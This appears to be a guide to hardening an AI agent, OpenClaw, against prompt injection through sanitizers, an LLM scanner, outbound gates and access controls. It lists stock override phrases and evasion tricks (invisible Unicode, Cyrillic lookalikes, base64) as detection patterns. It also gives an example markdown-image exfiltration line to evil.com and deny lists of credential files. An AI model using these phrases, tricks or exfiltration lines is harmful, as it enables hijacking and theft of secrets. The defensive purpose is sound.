# OpenClaw Production Upgrades — Phase 17

## Phase 17: Security Hardening — 6-Layer Prompt Injection Defense

Inspired by Matthew Berman's "Teaching OpenClaw to not get Hacked" (1,542 bookmarks). Your agent processes untrusted input from X articles, web pages, email, and chat — every one of those is a prompt injection surface. This phase adds a layered defense system.

**The core principle:** No single check catches everything. Layers run cheapest first — most attacks die at Layer 1 (free, instant regex) and never reach Layer 2 (an LLM call).

### 17.1 Architecture Overview

```
Untrusted input
  → Layer 1: Text sanitization (pattern matching, Unicode cleanup)
  → Layer 2: Frontier scanner (LLM-based risk scoring)
  → Layer 3: Outbound content gate (catches leaks going out)
  → Layer 4: Redaction pipeline (PII, secrets, paths)
  → Layer 5: Runtime governance (spend caps, volume limits, loop detection)
  → Layer 6: Access control (file paths, URL safety)
```

All tools live in `tools/security/` with a single config file and a master gate that chains Layers 1+2.

### 17.2 Layer 1: Deterministic Text Sanitizer

The workhorse. Runs on every piece of untrusted text before any LLM sees it. Instant, no API calls.

**Create `tools/security/sanitize.sh`:**

What it strips/detects:
- **Invisible Unicode** — Zero-width spaces, joiners, RTL/LTR marks, soft hyphens, BOMs. Invisible to humans, readable by LLMs. An email that looks normal could contain full override instructions between every character.
- **HTML entities** — `&#115;ystem` decodes to `system`. Bypasses pattern matching.
- **Cyrillic lookalikes** — аеорсух normalized to aeopcyx. Your regex for "system" won't catch "ѕyѕtem".
- **Role markers** — "ignore previous instructions", "you are now", "system:", "reveal your prompt", "admin mode", "debug mode", jailbreak patterns, special tokens ([INST], <|system|>)
- **Base64 blocks** — Encoded hidden instructions
- **Excessive combining marks** — Garbled text attacks

```bash
# Usage: echo "untrusted text" | bash tools/security/sanitize.sh
# Exit 0 = clean, Exit 1 = blocked
# Stats to stderr as JSON: {"role_markers": 5, "total_score": 10, "blocked": true}
```

Scoring: each detection type adds points. Threshold (default 3) triggers block. Configurable in `config.json`.

### 17.3 Layer 2: Frontier Scanner

Pattern matching catches known attacks. But prompt injection is a semantic problem — attackers phrase intent a thousand ways. The frontier scanner uses a dedicated LLM (not your agent's model) for classification.

```bash
# Usage: echo "text" | bash tools/security/frontier-scan.sh --source web
# Returns: {"verdict": "allow|review|block", "score": 0-100, "categories": [...]}
```

Key design decisions:
- **Use the strongest model available** for scanning (or gpt-4o-mini for cost). A weak model scanning for injections might fall for the very attack it's detecting.
- **Override the model's verdict** if score contradicts it (says "allow" but scores 75 → force block)
- **Fail behavior per source:** email/webhook = fail closed (block on error). Chat/web = fail open (allow on error). Configurable.

### 17.4 Layer 3: Outbound Content Gate

Protects against malicious *output* — things the LLM might produce that shouldn't leave the system.

```bash
# Usage: echo "outbound message" | bash tools/security/outbound-gate.sh
# Exit 0 = clean, Exit 1 = blocked
```

Catches:
- **API keys** — OpenAI (sk-...), Anthropic (sk-ant-...), GitHub (ghp_/gho_), Telegram bot tokens, AWS keys
- **Internal file paths** — /Users/you/, ~/.openclaw/, ~/.config/, ~/.ssh/
- **Private IPs** — localhost, 192.168.x, 10.x, 172.16-31.x
- **Prompt injection artifacts** — Role markers that survived into output
- **Data exfiltration** — `![img](https://evil.com/steal?data=SECRET)` — markdown image tags that phone home

### 17.5 Layer 4: Redaction Pipeline

Strips sensitive data from any outbound text:

```bash
# Usage: echo "text with secrets" | bash tools/security/redact.sh
# Output: text with [REDACTED_PHONE] and [REDACTED_EMAIL]
```

| Pattern | Replacement |
|---------|------------|
| API keys (sk-*, ghp_*, etc.) | `[REDACTED_API_KEY]` |
| Personal emails (gmail, yahoo, etc.) | `[REDACTED_EMAIL]` |
| Phone numbers (US + E.164) | `[REDACTED_PHONE]` |
| SSN patterns | `[REDACTED_SSN]` |
| Credit card patterns | `[REDACTED_CC]` |
| Sensitive file paths | `[REDACTED_PATH]` |

Work email domains pass through. Only personal email providers get redacted.

### 17.6 Layer 5: Runtime Governance

**"Bugs burn more money than attacks."** — Berman's key insight. Cron overlaps, retry storms, and cursor bugs cost more than malicious attacks.

```bash
# Check if a call is allowed:
bash tools/security/governance.sh check

# Log a call:
bash tools/security/governance.sh log --cost 0.05 --caller "email-sweep"

# View status:
bash tools/security/governance.sh status
```

Four mechanisms:
- **Spend limit** — Warn at $5/5min, hard cap at $15/5min
- **Volume limit** — 200 calls/10min global, per-caller limits (email-sweep: 40, frontier-scan: 50)
- **Lifetime counter** — 500 calls per process. Catches infinite loops no matter how they happen.
- **Duplicate detection** — Hash recent prompts, return cached if seen in last 5 minutes

### 17.7 Layer 6: Access Control

```bash
# Check file access:
bash tools/security/access-control.sh check-path "/Users/you/.ssh/id_rsa"
# {"allowed": false, "reason": "Matches deny filename: .ssh"}

# Check URL access:
bash tools/security/access-control.sh check-url "http://192.168.1.1/admin"
# {"allowed": false, "reason": "Private IP (192.168.x)"}
```

Path guards:
- Deny list: `.env`, `.ssh`, `credentials`, `tokens`, `id_rsa`, `.gnupg`, `keychain`, `secret`, `.netrc`
- Deny extensions: `.pem`, `.key`, `.p12`, `.pfx`, `.jks`
- Allowed directories whitelist (only your workspace + projects + tmp)

URL safety:
- Only http/https allowed
- Block private/reserved IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, ::1)
- Block DNS rebinding services

### 17.8 Master Gate

Chains Layer 1 + Layer 2 behind a single entry point:

```bash
# Full gate (sanitize + scan):
echo "untrusted text" | bash tools/security/gate.sh --source web

# Sanitize only (skip LLM scanner):
echo "untrusted text" | bash tools/security/gate.sh --sanitize-only

# For email (fail-closed on scanner error):
echo "email body" | bash tools/security/gate.sh --source email
```

### 17.9 Configuration

All thresholds in one file (`tools/security/config.json`):

```json
{
  "sanitizer": { "max_chars": 50000, "block_threshold": 3 },
  "scanner": {
    "model": "gpt-4o-mini",
    "review_threshold": 35,
    "block_threshold": 70,
    "fail_closed_sources": ["email", "webhook"],
    "fail_open_sources": ["chat", "web"]
  },
  "governance": {
    "spend_warn_5min": 5.0,
    "spend_cap_5min": 15.0,
    "volume_cap_10min": 200,
    "lifetime_cap": 500
  },
  "access": {
    "allowed_dirs": ["/Users/you/workspace/", "/tmp/"],
    "deny_filenames": [".env", ".ssh", "credentials", "tokens", "id_rsa"]
  }
}
```

### 17.10 Benefits Analysis

| Before | After | Impact |
|--------|-------|--------|
| Untrusted X articles go straight to context | Sanitized first, role markers stripped | Invisible Unicode and injection patterns caught before LLM sees them |
| Outbound messages could leak credentials | Gate checks every message before send | API keys, file paths, PII auto-blocked |
| No spend protection | $15/5min hard cap + volume + lifetime limits | Runaway crons and retry storms can't drain your API budget |
| Agent can read any file | Path deny list blocks .env, .ssh, credentials | Successful injection can't escalate to credential theft |
| Agent can hit any URL | Private IPs blocked, only http/https | No SSRF attacks to internal services |
| One failure = full compromise | 6 independent layers | Each layer works alone; no single point of failure |

**The key insight from Berman:** *"Each layer has to be independent. The sanitizer catches known patterns. The scanner catches semantic attacks. The governor caps the damage if both fail. No single layer is enough, and if any layer depends on another working correctly, the whole system is fragile. Independence is the point."*

---
